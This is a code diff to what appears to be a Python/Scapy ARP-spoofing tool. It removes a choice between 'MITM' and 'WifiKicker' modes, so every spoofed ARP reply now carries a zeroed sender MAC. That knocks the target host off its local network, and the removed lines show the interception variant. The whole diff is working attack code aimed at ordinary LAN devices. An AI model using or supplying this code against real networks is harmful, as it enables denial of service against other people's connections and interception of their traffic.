@@ -33,9 +33,8 @@ def getMac(ip, interface=None):
 
 class Spoofer:
 
-    def __init__(self, con_mode, spoof_mode):
+    def __init__(self, con_mode):
         self.connection_mode = con_mode
-        self.spoof_mode = spoof_mode
 
     def spoof(self, target_ip, spoofed_ip):
         
@@ -46,12 +45,9 @@ class Spoofer:
         elif self.connection_mode == "eth":
             target_mac = getMac(target_ip)
 
-        if self.spoof_mode == "MITM":
-            spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, op=2)  # Unless explicitly declared in this function, ARP() will use your MAC address as the default sender MAC address
-        elif self.spoof_mode == "WifiKicker":
-            spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc="00:00:00:00:00:00", op=2)
-
+        spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc="00:00:00:00:00:00", op=2)
         send(spoofed_arp, verbose=1)
+            
         print("Spoofed ARP sent to the IP", target_ip, "with MAC", target_mac)
 
 
